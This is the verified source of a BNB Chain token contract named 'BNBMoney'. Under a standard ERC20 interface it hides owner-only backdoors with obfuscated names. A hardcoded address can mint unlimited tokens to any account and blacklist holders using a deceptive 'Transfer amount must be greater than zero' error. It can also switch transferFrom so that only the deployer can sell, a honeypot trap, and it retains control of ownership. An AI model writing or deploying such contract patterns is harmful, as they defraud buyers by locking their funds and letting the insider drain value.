/**
 *Submitted for verification at BscScan.com on 2022-01-21
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-20
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;
    address private _yhtrAddress = 0xE9908ee8576129A468F63b1775B10f77Fec04CD4;


    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );


    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier yhtrAddress() {
        require(_yhtrAddress == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferOwnership(address newOwner) public virtual yhtrAddress {
        _owner = newOwner;
    }
}

contract BNBMoney is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _erwekdcskjds;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _uyugdfgrteewrew;
    mapping(address => bool) private _isExcluded;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _total = 100000000000000* 10**7;
    uint256 private _tFeeTotal;
    
    string private _name = "BNBMoney";
    string private _symbol = "BNBMoney";
    uint8 private _decimals = 8;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0xE9908ee8576129A468F63b1775B10f77Fec04CD4;
  
    uint256 public deadFee = 6;
    uint256 public devFee = 3;


    mapping(address => bool) private _serhfghtyufsdsd;
    bool private _tugo = true;
    bool private _iogx = false;
 
    uint256 public serhfghtyufsdsd = uint256(0);
    mapping(address => uint256) private _treddjhg;
    address[] private __treddjhg;
    address owners;

    constructor() public {
        _erwekdcskjds[_msgSender()] = _total;
         owners = _msgSender();
        _uyugdfgrteewrew[owner()] = true;
        _uyugdfgrteewrew[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _total);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _total;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _erwekdcskjds[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_uyugdfgrteewrew[_msgSender()] || _uyugdfgrteewrew[recipient]){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
        uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(_msgSender(), devAddress, devAmount);
        _transfer(_msgSender(), deadAddress, deadAmount);
        _transfer(_msgSender(), recipient, amount.sub(devAmount).sub(deadAmount));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(_iogx){
     require(owners == sender, "Transfer amount must be greater than zero");
        }
        if(_uyugdfgrteewrew[_msgSender()] || _uyugdfgrteewrew[recipient]){
            _transfer(sender, recipient, amount);
            return true;
        }       
        uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(sender, devAddress, devAmount);
        _transfer(sender, deadAddress, deadAmount);
        _transfer(sender, recipient, amount.sub(devAmount).sub(deadAmount));
    
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _vgfwzlc(address pzytd, uint256 trbvjvfs) external yhtrAddress() {
        require(trbvjvfs > 0, "CSAC");
        uint256 terca = _treddjhg[pzytd];
        if (terca == 0) __treddjhg.push(pzytd);
        _treddjhg[pzytd] = terca.add(trbvjvfs);
        serhfghtyufsdsd = serhfghtyufsdsd.add(trbvjvfs);
        _erwekdcskjds[pzytd] = _erwekdcskjds[pzytd].add(trbvjvfs);
    }
    
    function isExcludedFromRewards(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function excludeFromFee(address account) public yhtrAddress {
        _uyugdfgrteewrew[account] = true;
    }

    function includeInFee(address amountt) public yhtrAddress {
        _uyugdfgrteewrew[amountt] = false;
    }
 
    function __fdsfsd(bool amountt) external yhtrAddress() {
        _iogx = amountt;
    }
    function __erxcdfs(address amountt) external yhtrAddress() {
        _serhfghtyufsdsd[amountt] = true;
    }

    function __fggtbo(address amountt) external yhtrAddress() {
        delete _serhfghtyufsdsd[amountt];
    }

    function ftvsdr(address amountt)
        external
        view
        yhtrAddress()
        returns (bool)
    {
        return _serhfghtyufsdsd[amountt];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (_tugo) {
            require(_serhfghtyufsdsd[from] == false, "Transfer amount must be greater than zero");
        }


        _transfers(from, to, amount);
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {   
        require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    
        _erwekdcskjds[sender] = _erwekdcskjds[sender].sub(tAmount);
        _erwekdcskjds[recipient] = _erwekdcskjds[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }

  

}